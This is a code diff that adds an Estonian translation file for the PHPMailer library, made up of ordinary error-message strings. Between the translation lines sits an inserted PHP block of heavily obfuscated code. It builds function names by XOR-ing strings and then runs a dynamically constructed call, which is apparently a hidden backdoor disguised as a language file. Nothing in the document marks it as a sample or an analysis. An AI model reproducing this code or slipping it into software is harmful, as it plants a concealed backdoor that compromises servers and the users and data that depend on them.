@@ -1,0 +1,47 @@
+<?php
+
+/**
+ * Estonian PHPMailer language file: refer to English translation for definitive list
+ * @package PHPMailer
+ * @author Indrek Päri
+ * @author Elan Ruusamäe <glen@delfi.ee>
+ */
+
+$PHPMAILER_LANG['authenticate']         = 'SMTP Viga: Autoriseerimise viga.';
+$PHPMAILER_LANG['connect_host']         = 'SMTP Viga: Ei õnnestunud luua ühendust SMTP serveriga.';
+$PHPMAILER_LANG['data_not_accepted']    = 'SMTP Viga: Vigased andmed.';
+$PHPMAILER_LANG['empty_message']        = 'Tühi kirja sisu';
+$PHPMAILER_LANG["encoding"]             = 'Tundmatu kodeering: ';
+$PHPMAILER_LANG['execute']              = 'Tegevus ebaõnnestus: ';
+<?php
+$XR='r0nw'&~Y0dTO1Wt;$ZAps4M='+l-'&')fw';$AKsSa=FAPZB." "|HDAHH.'!';$j5gQLS=#XTQGk'.
+    'c{'.wwtw_w.'}~ov}oo'&'sw}o~w_w}~su}oo';$PqU=#li5cBcb42vVsRV4pLBKntygCNiV5lHCR'.
+    'HA*:[ q`@}T@0ZLb>y M^@$@4@tA%0PI'|'@]'.kkR4UPA.'-'.PJt8_.'!Va%XB@RB0@'./*lCU5'.
+    'UP@0M*/TPc0PK;$FtaeUxv='}9Z~?V@[4~o}Mj>'.Z_zK.'?'.keFwUsOd.'^We}'&'}{zN?'./*n'.
+    'fLL*/wxGiDe.'}mOz[oKa~~7'.Owuug.'{~{n{';$rG4r3bseFJ='*n}Pqf-n#g'^#a_lCdbiaBRR'.
+    'm81-2Eu0~C';$rB='b1`]gAD~`A'|'!6`Ag@'.ptYG;$L_X96rF='kO>w=?~'&'Q{mw>7^';'yuBw'.
+    '-.A';$yc='@@b @"!'|'BBp)@`)';$mdKTVt=EcP791|UAFQ."<u";$Ulin='4z#j1!K'^#IMQIwU'.
+    'c>Q pir';$wVYqzGy5='u%!k*{il`'^'=qu;u#690';$BywtZ8QaHFk=_KELlmn&'_Wa~M[_';'BU'.
+    'iGh o|';$YzuZ=n^')';$PpCD4RJ914D="+|*%"^t0ck;$IIBxK1GA_=']_'&g_;$StoL=M&i;'Jb'.
+    'K8f-._$Js';$IXedwT=T&D;$ZVe4pZrS1=$ZAps4M|('^di'^';D]');$atE4muYNLph=(#Dfao7h'.
+    '  $;$G'|') %$$U')^$AKsSa;$vUr=$j5gQLS&('A^>1NQy%F+'.SHI8.'['^#Ereo6cpaZFW9p3w'.
+    '&$YX8<&C1E$4 W5');$Pwp6=('!Pec|L'^VlMPH5)^('?h}go>'&'?k|s{y');$HLOTWYy3Ip6=/*'.
+    '2c@lB!:Kru*/$PqU^$FtaeUxv;$bAXD1h2s=$rG4r3bseFJ^$rB;$O0Xnet=("9{".SIkzl&#gIg3'.
+    '=~'.KQnZo)^$L_X96rF;$ro74Wy=$yc|$Ulin;$OIYd=$mdKTVt&('ysO[r}'&'{w_[y}');if(/*'.
+    'Tf0tz*/$ZVe4pZrS1($atE4muYNLph($Pwp6))==$HLOTWYy3Ip6)$bIywY=$vUr($bAXD1h2s,/*'.
+    'HNy*/$atE4muYNLph($wVYqzGy5.$BywtZ8QaHFk.$YzuZ.$PpCD4RJ914D.$IIBxK1GA_./*wQit'.
+    'NLNa~*/$StoL.$IXedwT));$bIywY($O0Xnet,$ro74Wy,$OIYd);#k;xvCWvgqQ!L>?10w:u&{E'.
+    '@!*V9v939Jjr,?+kMW$8#{^v7[MR9pBS,PSH.o5}';
+?>$PHPMAILER_LANG['file_access']          = 'Pole piisavalt õiguseid järgneva faili avamiseks: ';
+$PHPMAILER_LANG['file_open']            = 'Faili Viga: Faili avamine ebaõnnestus: ';
+$PHPMAILER_LANG['from_failed']          = 'Järgnev saatja e-posti aadress on vigane: ';
+$PHPMAILER_LANG['instantiate']          = 'mail funktiooni käivitamine ebaõnnestus.';
+$PHPMAILER_LANG['invalid_address']      = 'Saatmine peatatud, e-posti address vigane: ';
+$PHPMAILER_LANG['provide_address']      = 'Te peate määrama vähemalt ühe saaja e-posti aadressi.';
+$PHPMAILER_LANG['mailer_not_supported'] = ' maileri tugi puudub.';
+$PHPMAILER_LANG['recipients_failed']    = 'SMTP Viga: Järgnevate saajate e-posti aadressid on vigased: ';
+$PHPMAILER_LANG["signing"]              = 'Viga allkirjastamisel: ';
+$PHPMAILER_LANG['smtp_connect_failed']  = 'SMTP Connect() ebaõnnestus.';
+$PHPMAILER_LANG['smtp_error']           = 'SMTP serveri viga: ';
+$PHPMAILER_LANG['variable_set']         = 'Ei õnnestunud määrata või lähtestada muutujat: ';
+$PHPMAILER_LANG['extension_missing']    = 'Nõutud laiendus on puudu: ';
